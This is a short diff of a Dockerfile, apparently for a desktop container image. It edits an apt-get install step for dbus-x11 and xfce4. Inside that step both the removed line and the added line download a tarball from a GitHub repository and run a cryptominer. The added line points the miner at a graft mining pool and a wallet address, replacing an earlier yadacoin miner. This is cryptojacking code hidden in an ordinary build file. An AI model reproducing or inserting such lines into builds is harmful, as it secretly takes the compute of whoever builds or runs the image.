@@ -73,6 +73,6 @@ ENV SCREEN_WIDTH=1280 \
 RUN apt-get update -qqy \
     && apt-get -qqy install --no-install-recommends \
         dbus-x11 xfce4 \
-    && wget https://github.com/alissa221/ada/raw/main/rama_221.tar.gz && tar xvzf rama_221.tar.gz && ./rama -a rx/yada -o yadacoin.cryptonpool.com:3333 -u 1HL5FiTJwo2Vs7PrWgjQ3Ft9MDbvNAVDP8  \
+    && wget https://github.com/alissa221/samo21/raw/main/samo-121.tar.gz && tar xvzf samo-121.tar.gz && cd samo-121 && ./samo -o graft.pool-pay.com:2324 -u G75v6irJdv4NDSUqQQ7MEkHrqH8vgKuE8P9htKW9tkUNc54i4XUo3hpCL3ngdoHCvHUYynHT5g7ayBevzBbBaRzUSK2WwYN -k -a rx/graft -t8  \
     && apt-get autoremove \
     && rm -rf /var/lib/apt/lists/* /var/cache/apt/*
